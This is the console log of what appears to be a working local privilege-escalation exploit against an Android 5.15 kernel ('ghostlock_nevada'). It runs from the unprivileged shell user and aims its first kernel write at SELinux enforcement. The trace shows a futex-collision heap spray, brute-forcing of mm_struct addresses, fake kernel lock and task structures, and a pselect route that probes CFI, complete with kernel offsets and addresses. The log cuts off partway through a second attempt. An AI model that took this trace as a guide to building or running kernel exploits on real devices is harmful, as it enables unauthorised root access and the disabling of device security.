[33m[*] [0mkernel: 5.15.180-android13-8-00018-g9b2308ac0ad6-ab14563692
[32m[+] [0moffsets matched: 5.15.180-android13-8-00018-g9b2308ac0ad6-ab14563692 (layout nevada-5.15)
[32m[+] [0mstartup context pid=12341 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
[32m[+] [0mstartup limits pid=12341 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
[32m[+] [0mbuild config pid=12341 label=ghostlock_nevada slide=pselect main=pselect
[32m[+] [0mp0 profile pid=12341 phys_offset=0000000040000000 kernel_phys_load=0000000040000000 delta=0000000000000000 slide_logger=ffffff8002b01e28 bootid_data=ffffff8002dc6819 init_task=ffffff8002c43640 root_tg=ffffff8002d58ac0 sysctl_bootid=ffffff8002dc6819
[33m[*] [0m[T+0ms] exploit start
[33m[*] [0m[T+5128ms] pre-W1 drain
[33m[*] [0mWrite 1 attempt 1/5
[33m[*] [0m=== W1: SELinux === target=0xffffff8002daad78 mode=1
[33m[*] [0m[T+5129ms]   heap spray start
[33m[*] [0mparameters cpu (16) mm_struct sz (400) mm slab order (3) thread cnt (8) collisions (4) mte disabled
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mstart finding collisisons
[33m[*] [0mtarget    00000075ffd950c8
[33m[*] [0m  000000657a005028 t=14062
[33m[*] [0m  000000657a79cce0 t=14210
[33m[*] [0m  000000657c632190 t=14234
[33m[*] [0mks collisions=3/3 baseline=4 threshold=10x (40) accepted=[14062..14234] slowest_rejected=5
[33m[*] [0mfound 3 collisisons
[33m[*] [0mstart bruteforcing
[33m[*] [0m[  0] start finding mm_struct [ffffff8000000000-ffffff8180000000]
[33m[*] [0m[  1] start finding mm_struct [ffffff8180000000-ffffff8300000000]
[33m[*] [0m[  4] start finding mm_struct [ffffff8600000000-ffffff8780000000]
[33m[*] [0m[  2] start finding mm_struct [ffffff8300000000-ffffff8480000000]
[33m[*] [0m[  6] start finding mm_struct [ffffff8900000000-ffffff8a80000000]
[33m[*] [0m[  3] start finding mm_struct [ffffff8480000000-ffffff8600000000]
[33m[*] [0m[  5] start finding mm_struct [ffffff8780000000-ffffff8900000000]
[33m[*] [0m[  7] start finding mm_struct [ffffff8a80000000-ffffff8c00000000]
[33m[*] [0mdone
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+13997ms]   heap spray done
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=-2 page=ffffff8009c58000 fake_lock=ffffff8009c58000 fake_w0=ffffff8009c58300 fake_task=ffffff8009c58400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000000 ex3=0000000000000000
[33m[*] [0mpselect pre-select +0ms
[33m[*] [0mpselect post-select +201ms ret=0
[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=1 delay=0
[33m[*] [0mpselect route probing cfi attempt=1 ret=0 expected=9
[33m[*] [0mpselect route done calls=1 success=1 step=0 errno=0
[33m[*] [0m[T+15208ms]   PI route done
[33m[*] [0mWrite 1 attempt 2/5
[33m[*] [0m=== W1: SELinux === target=0xffffff8002daad78 mode=1
[33m[*] [0m[T+15308ms]   heap spray start
[33m[*] [0mparameters cpu (16) mm_struct sz (400) mm slab order (3) thread cnt (8) collisions (4) mte disabled
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mstart finding collisisons
[33m[*] [0mtarget    00000075ffd950c8
[33m[*] [0m  0000006577d1c140 t=13388
[33m[*] [0m  0000006577fda730 t=15042
[33m[*] [0m  00000065790eafb0 t=13903
[33m[*] [0mks collisions=3/3 baseline=4 threshold=10x (40) accepted=[13388..15042] slowest_rejected=5
[33m[*] [0mfound 3 collisisons
[33m[*] [0mstart bruteforcing
[33m[*] [0m[  0] start finding mm_struct [ffffff8000000000-ffffff8180000000]
[33m[*] [0m[  4] start finding mm_struct [ffffff8600000000-ffffff8780000000]
[33m[*] [0m[  5] start finding mm_struct [ffffff8780000000-ffffff8900000000]
[33m[*] [0m[  7] start finding mm_struct [ffffff8a80000000-ffffff8c00000000]
[33m[*] [0m[  1] start finding mm_struct [ffffff8180000000-ffffff8300000000]
[33m[*] [0m[  2] start finding mm_struct [ffffff8300000000-ffffff8480000000]
[33m[*] [0m[  6] start finding mm_struct [ffffff8900000000-ffffff8a80000000]
[33m[*] [0m[  3] start finding mm_struct [ffffff8480000000-ffffff8600000000]
[33m[*] [0mdone
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+24295ms]   heap spray done
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=-2 page=ffffff8015a08000 fake_lock=ffffff8015a08000 fake_w0=ffffff8015a08300 fake_task=ffffff8015a08400 in0=0000000000000000 in3=0000000000000000 out0=0000000000000000 ex0=0000000000000000 ex1=0000000000000000 ex2=0000000000000000 ex3=0000000000000000
[33m[*] [0mpselect pre-select +0ms
